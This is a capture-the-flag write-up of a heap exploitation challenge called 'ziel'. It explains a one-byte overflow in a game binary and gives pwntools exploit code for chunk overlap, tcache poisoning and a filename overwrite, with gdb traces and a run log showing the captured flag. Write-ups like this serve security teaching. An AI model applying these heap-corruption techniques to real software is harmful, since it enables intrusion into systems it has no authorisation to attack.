[Pwn - 1000] ziel (0 solve)
======

This challenge is solved **after** the competition. It's a shame that the I wasn't able to solve the challenge during it. Note that some pseudocode and gdb output are omitted for brevity sake.


[zip file](https://sturmisch.github.io/assets/2019/CJ%20Finale/ziel/ziel.zip) containing docker files and binary. [Exploit](https://sturmisch.github.io/assets/2019/CJ%20Finale/ziel/exploit.py) here


### Analysis

We're given a binary:
```
file ziel; checksec ziel
ziel: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=edb9e4c51008c1427bc684ca085dfd67ff4d0b24, stripped
[*] '/home/tempest/CTF/2019/CJ/final/pwn/ziel/ziel'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
During competition we're given a zip with Dockerfile, the base image is Ubuntu 18.10 (libc is 2.28).


Upon running the binary, we can see that the program is actually a world building game.
```
$ ./ziel
============================================================
=                  World Simulator v3.0.5                  =
============================================================

- Input a save code. If you don't have any just press enter.
Save code: wtf

- Please set your world size.
Width: 10
Height: 10


- World:
------------
|          |
|          |
|          |
|          |
|          |
|          |
|          |
|          |
|          |
|          |
------------
- Choose an action:
1. Next
2. Spawn
3. Kill
4. Save
5. Load
6. Restart
7. Quit
>
```


Basically, the spawn allocates a player chunk (as a char \* with maximum size of 200) with the following structure:
```C
struct player
{
	char ID;
	int vx;
	int vy;
	char desc[size-12];
};
```


`kill` frees the chunk and marks a global array (no double free nor UAF). This means that if we killed someone, the ID is still there on our map. The `save` feature concatenates `player->ID` and save it to a file under `/tmp` directory. Load directly opens the file and load characters into our map. 


The vulnerability is in `spawn` function:
```C
...
ptrs[y*width+x] = malloc(size+11);
printf("Description: ");
int len = readline(s,size) // returns n byte read
players[y*width+x]->ID = ID;
players[y*width+x]->vx = vx;
players[y*width+x]->vy = vy;
memcpy(players[y*width+x]->desc,s,len) // VULN
...
```
If we allocate for example 0x88 bytes, we can overwrite the size field of next chunk. With almost all mitigations enabled and no easy leak, how are we able to exploit the binary ?


### Exploitation


The `load` function opens a file from a pointer in heap (allocated in the beginning). If we're able to overwrite the pointer's content, we can read the flag's content into our map!


With the one byte overflow, we can [overlap chunks](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c) between two smallbin chunks; But first, we need to fill the tcache. Here's initial script:
```Python
def setup_game(w,h,savename=''):
	r.sendlineafter("code: ",savename)
	r.sendlineafter("Width: ",str(w))
	r.sendlineafter("Height: ",str(h))

def move():
	r.sendlineafter("> ",'1')

def spawn(ID,sx,sy,vx,vy,len,desc):
	r.sendlineafter("> ",'2')
	r.sendlineafter("X: ",str(sx))
	r.sendlineafter("Y: ",str(sy))
	r.sendlineafter("ID: ",ID)
	r.sendlineafter("X: ",str(vx))
	r.sendlineafter("Y: ",str(vy))
	r.sendlineafter("length: ",str(len-11))
	r.sendlineafter("Description: ",desc[:len-11])

def kill(x,y):
	r.sendlineafter("> ",'3')
	r.sendlineafter("X: ",str(x))
	r.sendlineafter("Y: ",str(y))

def save():
	r.sendlineafter("> ",'4')

def load():
	r.sendlineafter("> ",'5')

def restart(w,h,savename=''):
	r.sendlineafter("> ",'6')
	setup_game(w,h,savename)

def exploit():
	setup_game(160,1,"wtf")

	log.info("allocating 0xa0 and 0x90 chunks")
	for i in xrange(14):
		spawn(chr(0x61+i),i,0,0,0,0x98 if i < 7 else 0x88,chr(0x61+i)*8)

	spawn('?',14,0,0,0,0x98,'?'*8)
	spawn('*',15,0,0,0,0x48,'*'*8)
	spawn('*',16,0,0,0,0x48,'*'*8)
	spawn('*',17,0,0,0,0x48,'*'*8)
	spawn('*',18,0,0,0,0x48,'*'*8)
	spawn('x',19,0,0,0,0x88,'x'*8)
	spawn('=',20,0,0,0,0x28,'='*8)
```
The `?` and `x` chunk is the smallbins we want to coalesce. I allocated different chunk sizes because I doesn't want to mess with heap layout.


We proceed to fill the tcache, and free the chunk above the `x` chunk:
```Python
log.info("filling tcache for 0xa0 and 0x90 chunks")
for i in xrange(14): kill(i,0)

log.info("freeing payload chunk")
kill(18,0)
```


Then we allocate back the chunk and trigger one byte overflow:
```Python
log.info("adjusting fake size")
log.info("triggering one byte overflow")
payload = ''.ljust(0x3d-9,'+')
payload += p64(0xa0+0x50+0x50+0x50+0x50)
payload += p64(0x90)
spawn('+',0x30+28,0,0,0,0x48,payload)
```


After that, we free the `x` chunk and coalesces the two smallbins. Here's the state before target is freed:
```
gef> tel 0x0000155555557d30 9
0x0000155555557d30|+0x0000: 0x0000000000000000 # '?' chunk, freed into unsorted bin
0x0000155555557d38|+0x0008: 0x00000000000000a1
0x0000155555557d40|+0x0010: 0x0000155555314ca0 -> 0x0000155555557fd0 -> 0x0000000000000000
0x0000155555557d48|+0x0018: 0x0000155555314ca0 -> 0x0000155555557fd0 -> 0x0000000000000000
gef> tel 0x0000155555557f10
0x0000155555557f10|+0x0000: 0x00000000000001e0 # fake prev_size
0x0000155555557f18|+0x0008: 0x0000000000000090 # toggle off prev_in_use bit of this chunk
0x0000155555557f20|+0x0010: 0x0000000000000078 ("x"?)	<-$rax, $rdi
0x0000155555557f28|+0x0018: 0x7878787800000000
0x0000155555557f30|+0x0020: 0x0000000078787878 ("xxxx"?)
```


And here's after it has been freed:
```
gef> tel 0x0000155555557d30 5
0x0000155555557d30|+0x0000: 0x0000000000000000
0x0000155555557d38|+0x0008: 0x0000000000000271
0x0000155555557d40|+0x0010: 0x0000155555314ca0 -> 0x0000155555557fd0 -> 0x0000000000000000
0x0000155555557d48|+0x0018: 0x0000155555314ca0 -> 0x0000155555557fd0 -> 0x0000000000000000
0x0000155555557d50|+0x0020: 0x000000003f3f3f3f ("????"?)
```


We're going to partial overwrite the 0x50 chunk's fd (after we free two of them), telling malloc to allocate over the stored filename's heap address. Since we haven't leaked anything yet, we need to bruteforce 4 bit of the heap address (the last 1.5 bytes should be constant since this is the first allocated chunk):
```Python
log.info("fill 0x50 tcache")
kill(16,0)
kill(15,0)

spawn('?',40,0,0,0,0x78,'?'*8)

log.info("partial overwrite fd")
payload = p32(0)
payload += p64(0xa0)
payload += p64(0x50)
payload += p16(0x6240)
spawn('P',41,0,0,0,0x58,payload)

spawn('A',42,0,0,0,0x48,"wtf")
log.info("overwriting filename")

payload = "wtf?"
payload += p64(0)
payload += p64(0)
payload += "/home/ziel/flag\x00" if len(sys.argv) > 2 else "./flag\x00"
spawn('Y',43,0,0,0,0x48,payload)
```
```
gef> tel 0x0000155555556250 3
0x0000155555556250|+0x0000: 0x0000000000000000
0x0000155555556258|+0x0008: 0x0000000000000051 ("Q"?)
0x0000155555556260|+0x0010: "/tmp/wtf"
```


After allocating 0x50 chunk once, the next allocation should land before the filename's heap address. Here's the state before binary calls `load` function with overwritten name:
```
->0x15555531cc14                  call   0x15555531ca60
   \->  0x15555531ca60                  jmp    QWORD PTR [rip+0x20255a]        # 0x15555551efc0
      0x15555531ca66                  push   0xe
      0x15555531ca6b                  jmp    0x15555531c970
      0x15555531ca70                  jmp    QWORD PTR [rip+0x202552]        # 0x15555551efc8
      0x15555531ca76                  push   0xf
      0x15555531ca7b                  jmp    0x15555531c970
------------------- arguments (guessed) ----------
0x15555531ca60 (
   $rdi = 0x0000155555556260->0x660067616c662f2e ("./flag"?),
   $rsi = 0x000015555531de18->0x002f706d742f0072 ("r"?),
   $rdx = 0xfffffffffffffc3d,
   $rcx = 0x0000000000000000
)
------------------- threads ----------------------
[#0] Id 1, Name: "ld-2.28.so", stopped, reason: BREAKPOINT
------------------- trace ------------------------
[#0] 0x15555531cc14->call 0x15555531ca60
[#1] 0x7fffffffecf0->add ch, ch
--------------------------------------------------

Breakpoint 4, 0x000015555531cc14 in ?? ()

```


After this, it should load the flag into our map. But, if we reload the map using `next` function, we can't see the flag. This is because we store our players in the beginning of our map. Simply adding an offset (for example 0x30) for the XY coordinates solved it. Output of exploit script:
```
┌─[tempest@tempestuous]─[~/CTF/2019/CJ/final/pwn/ziel]
└──╼ $ python exploit.py go
[*] '/home/tempest/CTF/2019/CJ/final/pwn/ziel/ziel'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to localhost on port 10004: Done
[*] allocating 0xa0 and 0x90 chunks
[*] filling tcache for 0xa0 and 0x90 chunks
[*] freeing payload chunk
[*] adjusting fake size
[*] triggering one byte overflow
[*] freeing coalesce target
[*] coalescing chunk
[*] fill 0x50 tcache
[*] partial overwrite fd
[*] overwriting filename
[*] spawning flag
[+] Flag: CJ{7866a5583234467317fcfd9f85b427c1}
[*] Closed connection to localhost port 10004
```